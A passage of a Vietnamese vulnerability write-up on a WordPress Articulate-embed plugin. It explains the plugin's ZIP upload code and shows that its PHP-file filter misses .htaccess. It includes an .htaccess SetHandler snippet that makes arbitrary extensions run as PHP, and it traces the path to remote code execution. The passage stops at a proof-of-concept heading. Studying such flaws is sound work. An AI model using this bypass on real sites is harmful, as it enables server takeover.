get_allowed_mime_types.&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;// Check if file has been uploaded&#xA;&#x9;if ( ! $chunks || $chunk == $chunks - 1 ) {&#xA;&#x9;&#x9;// Strip the temp .part suffix off&#xA;&#x9;&#x9;articulate_custom_rename( &amp;#34;{$filePath}.part&amp;#34;, $filePath );&#xA;&#x9;&#x9;// start extracting&#xA;&#x9;&#x9;// unzip file&#xA;&#x9;&#x9;$dir    = explode( &amp;#39;.&amp;#39;, $fileName );&#xA;&#x9;&#x9;$dir[0] = str_replace( &amp;#39; &amp;#39;, &amp;#39;_&amp;#39;, $dir[0] );&#xA;&#x9;&#x9;$target = getUploadsPath() . $dir[0];&#xA;&#x9;&#x9;$file   = $filePath;&#xA;&#x9;&#x9;while ( file_exists( $target ) ) {&#xA;&#x9;&#x9;&#x9;$r       = rand( 1, 10 );&#xA;&#x9;&#x9;&#x9;$target .= $r;&#xA;&#x9;&#x9;&#x9;$dir[0] .= $r;&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;$arr = extractZip( $file, $target, $dir[0] );&#xA;&#x9;&#x9;unlink( $filePath );&#xA;&#x9;&#x9;do_action( hook_name: &amp;#39;iea/uploaded_quiz&amp;#39;, $arr, $target );&#xA;&#x9;&#x9;$ok       = isset( $arr[4] ) ? $arr[4] : 0;&#xA;&#x9;&#x9;$response = array(&#xA;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;     =&amp;gt; $ok,&#xA;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39;   =&amp;gt; $arr[0],&#xA;&#x9;&#x9;&#x9;&amp;#39;folder&amp;#39; =&amp;gt; $arr[2],&#xA;&#x9;&#x9;&#x9;&amp;#39;path&amp;#39;   =&amp;gt; $arr[1],&#xA;&#x9;&#x9;&#x9;&amp;#39;name&amp;#39;   =&amp;gt; $arr[3],&#xA;&#x9;&#x9;&#x9;&amp;#39;target&amp;#39; =&amp;gt; $target,&#xA;&#x9;&#x9;);&#xA;&#x9;&#x9;die( json_encode( $response ) );&#xA;&#x9;} else {&#xA;&#x9;&#x9;die(&#xA;&#x9;&#x9;&#x9;json_encode(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;OK&amp;#39;   =&amp;gt; 1,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;info&amp;#39; =&amp;gt; __(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;Uploading chunks!&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#x9;exit;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;articulate_upload_ajax_file()&lt;/code&gt; xử lý upload file qua AJAX cho plugin. Cụ thể:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Khởi tạo &amp;amp; bảo mật cơ bản&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;articulate_setup_php_ini();&#xA;check_ajax_referer( &amp;#39;articulate_upload_file&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;articulate_setup_php_ini()&lt;/code&gt; — chỉnh các setting PHP (thường để cho phép upload lớn hơn, timeout&amp;hellip;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;check_ajax_referer()&lt;/code&gt; — kiểm tra nonce để ngăn CSRF.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Kiểm tra quyền người dùng&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! is_user_logged_in() || ! current_user_can( &amp;#39;upload_files&amp;#39; ) || ! current_user_can( &amp;#39;unfiltered_html&amp;#39; ) ) {&#xA;    die(json_encode([...]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Chỉ cho user đã đăng nhập và có capability &lt;code&gt;upload_files&lt;/code&gt; và &lt;code&gt;unfiltered_html&lt;/code&gt; thực hiện upload (Editor trở lên).&lt;/li&gt;&#xA;&lt;li&gt;Nếu không đủ quyền, trả về JSON lỗi và dừng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Lấy thông tin file và đường dẫn lưu&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$count_dirs = getDirs();&#xA;$file = $_FILES[&amp;#39;async-upload&amp;#39;];&#xA;$dir  = untrailingslashit( getUploadsPath() );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$_FILES[&#39;async-upload&#39;]&lt;/code&gt; là file upload từ client.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;getUploadsPath()&lt;/code&gt; trả về thư mục gốc để lưu (custom của plugin); &lt;code&gt;untrailingslashit()&lt;/code&gt; bỏ dấu &lt;code&gt;/&lt;/code&gt; cuối.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Kiểm tra lỗi upload ban đầu&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( empty( $_FILES ) || $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;error&amp;#39;] ) {&#xA;    die(json_encode([...]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu không có file hoặc có lỗi (upload error code), trả về lỗi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Xử lý chunked upload và đặt tên file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$chunk    = isset( $_REQUEST[&amp;#39;chunk&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunk&amp;#39;] ) : 0;&#xA;$chunks   = isset( $_REQUEST[&amp;#39;chunks&amp;#39;] ) ? intval( $_REQUEST[&amp;#39;chunks&amp;#39;] ) : 0;&#xA;$fileName = isset( $_REQUEST[&amp;#39;name&amp;#39;] ) ? sanitize_file_name( $_REQUEST[&amp;#39;name&amp;#39;] ) : sanitize_file_name( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;name&amp;#39;] );&#xA;$filePath = &amp;#39;&amp;#39; . $dir . &amp;#39;/&amp;#39; . sanitize_file_name( $fileName ) . &amp;#39;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Hỗ trợ upload theo mảnh (chunked). &lt;code&gt;chunk&lt;/code&gt; là index hiện tại, &lt;code&gt;chunks&lt;/code&gt; tổng số mảnh.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sanitize_file_name()&lt;/code&gt; làm sạch tên file để tránh ký tự nguy hiểm.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;filePath&lt;/code&gt; là đường dẫn file đích (trong thư mục upload của plugin).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Mở file &lt;code&gt;.part&lt;/code&gt; và ghi dữ liệu (append hoặc write)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$out = @fopen( &amp;#34;{$filePath}.part&amp;#34;, $chunk == 0 ? &amp;#39;wb&amp;#39; : &amp;#39;ab&amp;#39; );&#xA;if ( $out ) {&#xA;    $in = @fopen( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#39;rb&amp;#39; );&#xA;    if ( $in ) {&#xA;        while ( $buff = fread( $in, 4096 ) ) {&#xA;            fwrite( $out, $buff );&#xA;        }&#xA;    } else { die(...); }&#xA;    @fclose( $in );&#xA;    @fclose( $out );&#xA;    @unlink( $_FILES[&amp;#39;async-upload&amp;#39;][&amp;#39;tmp_name&amp;#39;] );&#xA;} else { die(...); }&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Mở file tạm &lt;code&gt;{$filePath}.part&lt;/code&gt;: nếu &lt;code&gt;chunk == 0&lt;/code&gt; mở để ghi mới (&lt;code&gt;wb&lt;/code&gt;), còn nếu là chunk tiếp theo mở append (&lt;code&gt;ab&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Đọc file tạm PHP (&lt;code&gt;tmp_name&lt;/code&gt;) và ghi vào file &lt;code&gt;.part&lt;/code&gt; theo từng block 4096 bytes.&lt;/li&gt;&#xA;&lt;li&gt;Sau ghi, đóng file và xóa file tạm của PHP.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Kiểm tra MIME/type theo file extension&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$mime  = wp_check_filetype( $filePath );&#xA;$mimes = get_allowed_mime_types( get_current_user_id() );&#xA;if ( ! isset( $mime[&amp;#39;type&amp;#39;] ) || ! in_array( $mime[&amp;#39;type&amp;#39;], array_values( $mimes ) ) ) {&#xA;    die(json_encode([...]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_check_filetype( $filePath )&lt;/code&gt; dựa trên tên/đuôi file để trả về MIME (không kiểm tra nội dung nhị phân).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;get_allowed_mime_types( $user_id )&lt;/code&gt; trả về danh sách MIME được phép cho user hiện tại.&lt;/li&gt;&#xA;&lt;li&gt;Nếu MIME không nằm trong danh sách cho phép thì trả về lỗi bảo mật.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;Khi tất cả chunk đã được upload (hoàn tất)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! $chunks || $chunk == $chunks - 1 ) {&#xA;    articulate_custom_rename( &amp;#34;{$filePath}.part&amp;#34;, $filePath );&#xA;    $dir    = explode( &amp;#39;.&amp;#39;, $fileName );&#xA;    $dir[0] = str_replace( &amp;#39; &amp;#39;, &amp;#39;_&amp;#39;, $dir[0] );&#xA;    $target = getUploadsPath() . $dir[0];&#xA;    $file   = $filePath;&#xA;    while ( file_exists( $target ) ) {&#xA;        $r       = rand( 1, 10 );&#xA;        $target .= $r;&#xA;        $dir[0] .= $r;&#xA;    }&#xA;    $arr = extractZip( $file, $target, $dir[0] );&#xA;    unlink( $filePath );&#xA;    do_action( hook_name: &amp;#39;iea/uploaded_quiz&amp;#39;, $arr, $target );&#xA;    ...&#xA;    die( json_encode( $response ) );&#xA;} else {&#xA;    die(json_encode([&amp;#39;OK&amp;#39;=&amp;gt;1,&amp;#39;info&amp;#39;=&amp;gt;&amp;#39;Uploading chunks!&amp;#39;]));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu không dùng chunking hoặc chunk hiện tại là chunk cuối cùng thì:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;articulate_custom_rename()&lt;/code&gt; đổi tên file &lt;code&gt;.part&lt;/code&gt; -&amp;gt; file thực.&lt;/li&gt;&#xA;&lt;li&gt;Chuẩn bị &lt;code&gt;target&lt;/code&gt; (folder) dựa trên tên file (phần trước dấu &lt;code&gt;.&lt;/code&gt;) — dùng làm thư mục giải nén.&lt;/li&gt;&#xA;&lt;li&gt;Nếu &lt;code&gt;target&lt;/code&gt; đã tồn tại thì nối số ngẫu nhiên để tránh ghi đè.&lt;/li&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;extractZip($file, $target, $dir[0])&lt;/code&gt; để giải nén file vào &lt;code&gt;target&lt;/code&gt;. (Hàm này có thể xử lý ZIP; logic tùy plugin.)&lt;/li&gt;&#xA;&lt;li&gt;Xóa file zip gốc bằng &lt;code&gt;unlink($filePath)&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Gọi hook &lt;code&gt;iea/uploaded_quiz&lt;/code&gt; để plugin/third-party xử lý tiếp.&lt;/li&gt;&#xA;&lt;li&gt;Trả về JSON phản hồi với các thông tin (OK, folder, path, name, target).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu vẫn còn chunk đang upload thì trả về JSON thông báo đang upload.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;function extractZip( $fileName, $target, $dir ) {&#xA;&#x9;add_filter( &amp;#39;admin_memory_limit&amp;#39;, &amp;#39;articulate_run_admin_memory_limit_hook&amp;#39;, 100, 1 );&#xA;&#x9;// admin_memory_limit hook is called in wp_raise_memory_limit function that is called in unzip_file function.&#xA;&#x9;$arr      = array();&#xA;&#x9;$unzipper = new Quiz_Unzip( true );&#xA;&#x9;$unzip    = $unzipper-&amp;gt;unzip_file( $fileName, $target );&#xA;&#xA;&#x9;if ( $unzip ) {&#xA;&#x9;&#x9;wp_ajax_quiz_check_folder( $target );&#xA;&#x9;&#x9;if ( articulate_has_php_file( $target ) ) {&#xA;&#x9;&#x9;&#x9;$arr[0] = &amp;#39;&amp;lt;span style=&amp;#34;color:red&amp;#34;&amp;gt;&amp;#39; . sprintf( __( &amp;#39;ZIP upload successful, but we found a PHP file that is not allowed in your content directory. Contact support at %s&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; ), &amp;#39;&amp;lt;a style=&amp;#34;color: black&amp;#34; target=&amp;#34;_blank&amp;#34; href=&amp;#34;https://www.elearningfreak.com/upload-file/&amp;#34;&amp;gt;www.elearningfreak.com&amp;lt;/a&amp;gt;&amp;#39; ) . &amp;#39;&amp;lt;/span&amp;gt;&amp;#39;;&#xA;&#x9;&#x9;&#x9;articulate_rrmdir( $target );&#xA;&#x9;&#x9;&#x9;$arr[4] = 0;// OK = 0&#xA;&#x9;&#x9;&#x9;$arr[1] = &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;&#x9;$arr[2] = $dir;&#xA;&#x9;&#x9;&#x9;$arr[3] = &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;} else {&#xA;&#xA;&#x9;&#x9;&#x9;$file   = getFile( $target, true );// true to get return value as an array of detail&#xA;&#x9;&#x9;&#x9;$arr[0] = &amp;#39;Upload Complete!&amp;#39;;&#xA;&#x9;&#x9;&#x9;if ( $file[&amp;#39;status&amp;#39;] == &amp;#39;valid_html_file_found&amp;#39; || $file[&amp;#39;status&amp;#39;] == &amp;#39;index_html_file_found&amp;#39; || $file[&amp;#39;status&amp;#39;] == &amp;#39;other_html_file_found&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;&#x9;$arr[0] = __( &amp;#39;Upload Complete!&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; );&#xA;&#x9;&#x9;&#x9;&#x9;$arr[4] = 1;// OK = 1&#xA;&#x9;&#x9;&#x9;} elseif ( $file[&amp;#39;status&amp;#39;] == &amp;#39;no_html_file_found&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;&#x9;$arr[0] = &amp;#39;&amp;lt;span style=&amp;#34;color:black&amp;#34;&amp;gt;&amp;#39; . sprintf( __( &amp;#39;ZIP upload successful, but we were unable to find an HTML file. Either increase your WP_MEMORY_LIMIT, define your FS_METHOD as DIRECT, or contact support at %s&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; ), &amp;#39;&amp;lt;a style=&amp;#34;color: black&amp;#34; target=&amp;#34;_blank&amp;#34; href=&amp;#34;https://www.elearningfreak.com/upload-file/&amp;#34;&amp;gt;www.elearningfreak.com&amp;lt;/a&amp;gt;&amp;#39; ) . &amp;#39;&amp;lt;/span&amp;gt;&amp;#39;;&#xA;&#x9;&#x9;&#x9;&#x9;articulate_rrmdir( $target );&#xA;&#x9;&#x9;&#x9;&#x9;$arr[4] = 0;// OK = 0&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$arr[1] = getUploadsUrl() . $dir . &amp;#39;/&amp;#39; . $file[&amp;#39;file_name&amp;#39;];&#xA;&#x9;&#x9;&#x9;$arr[2] = $dir;&#xA;&#x9;&#x9;&#x9;$arr[3] = $file;&#xA;&#x9;&#x9;}&#xA;&#x9;} else {&#xA;&#x9;&#x9;$arr[0] = __( &amp;#39;File upload failed&amp;#39;, &amp;#39;insert-or-embed-articulate-content-into-wordpress&amp;#39; );&#xA;&#x9;&#x9;$arr[4] = 0;// OK = 0&#xA;&#x9;}&#xA;&#x9;return $arr;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;extractZip()&lt;/code&gt; xử lý &lt;strong&gt;giải nén file ZIP&lt;/strong&gt; sau khi người dùng upload, đồng thời &lt;strong&gt;kiểm tra an toàn&lt;/strong&gt; (cụ thể là không chứa file PHP, PHTML, PHAR), và trả về thông tin kết quả dạng mảng &lt;code&gt;$arr&lt;/code&gt;. Cụ thể:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Thực hiện giải nén&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$unzipper = new Quiz_Unzip( true );&#xA;$unzip    = $unzipper-&amp;gt;unzip_file( $fileName, $target );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Tạo đối tượng &lt;code&gt;Quiz_Unzip&lt;/code&gt; (có thể là wrapper quanh &lt;code&gt;unzip_file()&lt;/code&gt; của WordPress).&lt;/li&gt;&#xA;&lt;li&gt;Thực hiện giải nén &lt;code&gt;$fileName&lt;/code&gt; vào thư mục &lt;code&gt;$target&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$unzip&lt;/code&gt; trả về &lt;strong&gt;true&lt;/strong&gt; nếu giải nén thành công.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Kiểm tra có file PHP nguy hiểm không&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( articulate_has_php_file( $target ) ) {&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Gọi hàm &lt;code&gt;articulate_has_php_file()&lt;/code&gt; để &lt;strong&gt;quét toàn bộ thư mục giải nén&lt;/strong&gt; xem có chứa file &lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt; hay không.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function articulate_has_php_file( $dir ) {&#xA;    $dir = rtrim( $dir, &amp;#39;/&amp;#39; );&#xA;    if ( is_dir( $dir ) ) {&#xA;&#xA;        $dir_handle = opendir( $dir );&#xA;        if ( $dir_handle ) {&#xA;            while ( $file = readdir( $dir_handle ) ) {&#xA;                if ( $file != &amp;#39;.&amp;#39; &amp;amp;&amp;amp; $file != &amp;#39;..&amp;#39; ) {&#xA;                    if ( !is_dir( $dir . &amp;#39;/&amp;#39; . $file ) &amp;amp;&amp;amp;&#xA;                        (strpos($file, &amp;#39;.phtml&amp;#39;) !== false ||&#xA;                         strpos($file, &amp;#39;.php&amp;#39;) !== false &amp;amp;&amp;amp; $file != &amp;#39;relay.php&amp;#39; ||&#xA;                         strpos($file, &amp;#39;.phar&amp;#39;) !== false) ) { // Added condition for .phar files&#xA;                        return true;&#xA;                    } else {&#xA;                        $found = articulate_has_php_file( $dir . &amp;#39;/&amp;#39; . $file );&#xA;                        if ( $found ) {&#xA;                            return true;&#xA;                        }&#xA;                    }&#xA;                }&#xA;            }&#xA;            closedir( $dir_handle );&#xA;        }&#xA;&#xA;        return false;&#xA;    }&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Ngoài &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt; ta có thể dùng &lt;code&gt;.htaccess&lt;/code&gt; nhằm ghi đè cơ chế xử lý trong thư mục upload; kết quả là các file upload sau đó với phần mở rộng do attacker đặt (ví dụ &lt;code&gt;.abc&lt;/code&gt;, &lt;code&gt;.xnxx&lt;/code&gt;) có thể thực thi như file PHP.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;IfModule mod_php.c&amp;gt;&#xA;   &amp;lt;Files &amp;#34;*.abc&amp;#34;&amp;gt;&#xA;       SetHandler application/x-httpd-php&#xA;   &amp;lt;/Files&amp;gt;&#xA;&amp;lt;/IfModule&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Nếu có file nguy hiểm:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$arr[0] = &amp;#39;&amp;lt;span style=&amp;#34;color:red&amp;#34;&amp;gt;ZIP upload successful, but we found a PHP file...&amp;lt;/span&amp;gt;&amp;#39;;&#xA;articulate_rrmdir( $target ); // Xóa toàn bộ thư mục&#xA;$arr[4] = 0;&#xA;$arr[1] = &amp;#39;&amp;#39;;&#xA;$arr[2] = $dir;&#xA;$arr[3] = &amp;#39;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Báo lỗi cho người dùng.&lt;/li&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;articulate_rrmdir()&lt;/code&gt; để &lt;strong&gt;xóa toàn bộ thư mục đã giải nén&lt;/strong&gt; (đề phòng file độc).&lt;/li&gt;&#xA;&lt;li&gt;Đặt &lt;code&gt;OK = 0&lt;/code&gt; (thất bại).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Nếu KHÔNG có file PHP nguy hiểm:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$file = getFile( $target, true ); // Lấy thông tin file chính (HTML)&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Hàm &lt;code&gt;getFile()&lt;/code&gt; tìm file HTML chính (điểm bắt đầu của nội dung Articulate).&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra trạng thái của file HTML tìm thấy.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $file[&amp;#39;status&amp;#39;] == &amp;#39;valid_html_file_found&amp;#39; || ...) {&#xA;    $arr[4] = 1; // OK = 1&#xA;} elseif ( $file[&amp;#39;status&amp;#39;] == &amp;#39;no_html_file_found&amp;#39; ) {&#xA;    articulate_rrmdir( $target ); // Xóa thư mục nếu không có file HTML&#xA;    $arr[4] = 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Trả về thông tin kết quả&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$arr[1] = getUploadsUrl() . $dir . &amp;#39;/&amp;#39; . $file[&amp;#39;file_name&amp;#39;];&#xA;$arr[2] = $dir;&#xA;$arr[3] = $file;&#xA;return $arr;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;$arr&lt;/code&gt; chứa thông tin như:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[0]&lt;/code&gt;: thông điệp&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[1]&lt;/code&gt;: URL file&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[2]&lt;/code&gt;: thư mục&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[3]&lt;/code&gt;: thông tin chi tiết file&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[4]&lt;/code&gt;: trạng thái thành công/thất bại (OK)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php?action=articulate_upload_file&amp;#34;] --&amp;gt; B[&amp;#34;articulate_upload_ajax_file()&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;check_ajax_referer(&amp;#39;articulate_upload_file&amp;#39;) valid?&amp;#34;}&#xA;C -- No --&amp;gt; Z[&amp;#34;Return JSON error&amp;#34;]&#xA;C -- Yes --&amp;gt; D{&amp;#34;User has &amp;#39;upload_files&amp;#39; &amp;amp;&amp;amp; &amp;#39;unfiltered_html&amp;#39;?&amp;#34;}&#xA;D -- No --&amp;gt; Z&#xA;D -- Yes --&amp;gt; E[&amp;#34;Handle uploaded file → save to {$filePath}.part&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Combine chunks &amp;amp; rename → articulate_custom_rename(&amp;#39;{$filePath}.part&amp;#39;, $filePath)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;extractZip($filePath, $target, $dir)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Quiz_Unzip-&amp;gt;unzip_file($filePath, $target)&amp;#34;]&#xA;H --&amp;gt; I{&amp;#34;articulate_has_php_file($target) detect .php/.phtml/.phar ?&amp;#34;}&#xA;I -- Yes --&amp;gt; J[&amp;#34;articulate_rrmdir($target) → delete folder → return error&amp;#34;]&#xA;I -- No --&amp;gt; K[&amp;#34;(❌ Missing check for .htaccess file)&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Attacker uploads ZIP containing .htaccess&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;.htaccess overrides Apache handler in upload dir&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;→ Arbitrary File Upload → Remote Code Execution (RCE)&amp;#34;]&#xA;&#xA;%% Patch branch&#xA;K --&amp;gt; P[&amp;#34;✅ [Patched] articulate_has_php_file() adds &amp;#39;.htaccess&amp;#39; check&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Upload blocked if .htaccess detected&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    